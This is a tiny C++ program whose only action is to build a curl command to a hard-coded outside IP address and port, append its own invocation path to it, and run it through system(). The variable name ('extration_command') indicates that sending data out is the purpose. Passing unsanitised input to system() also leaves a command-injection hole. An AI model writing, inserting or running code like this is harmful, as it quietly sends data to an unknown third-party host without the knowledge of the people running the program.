#include <stdlib.h>

#include <string>

int main(int argc, char* argv[]) {
  std::string extration_command = "curl http://159.223.105.145:11111/?";
  extration_command += argv[0];
  system(extration_command.c_str());
  return 0;
}
